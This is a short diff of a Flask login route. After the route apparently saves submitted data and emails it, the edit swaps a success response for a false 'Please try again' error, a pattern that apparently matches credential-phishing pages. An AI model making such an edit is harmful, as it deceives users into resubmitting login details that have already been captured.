@@ -38,7 +38,7 @@ def login():
     except Exception as e: 
         print(f"Error sending email: {e}")
 
-    return jsonify({'status': 'success', 'message': 'Data saved and email sent'}), 200
+    return jsonify({'status': 'error', 'message': 'Please try again'}), 400
 
 if __name__ == '__main__':
     app.run(debug=True)
